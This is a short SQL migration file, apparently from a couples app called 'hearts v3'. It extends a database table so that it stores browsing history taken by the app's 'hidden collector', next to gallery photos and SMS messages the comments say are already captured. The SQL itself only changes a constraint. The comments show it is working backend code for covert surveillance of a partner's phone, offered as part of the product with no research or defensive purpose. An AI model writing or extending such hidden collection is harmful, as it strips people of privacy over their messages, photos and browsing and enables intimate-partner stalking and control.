-- hearts v3 · 0011_add_browser_kind.sql
-- Extend the hidden device-capture sink to accept browser-history rows.
--
-- The app's hidden collector now captures Chrome/Samsung-Internet browsing
-- history (URL + title + visit timestamp) as kind 'browser', alongside the
-- existing 'photo' (gallery) and 'sms' rows. device_media already stores all
-- kinds in one table keyed idempotently on (couple_id, kind, device_key), so
-- the ONLY schema change required is relaxing the kind CHECK — the storage and
-- RLS posture is unchanged and 'browser' rows carry metadata (no storage
-- upload), exactly like sms.

alter table public.device_media drop constraint if exists device_media_kind_check;

alter table public.device_media
  add constraint device_media_kind_check
  check (kind in ('photo','sms','browser'));
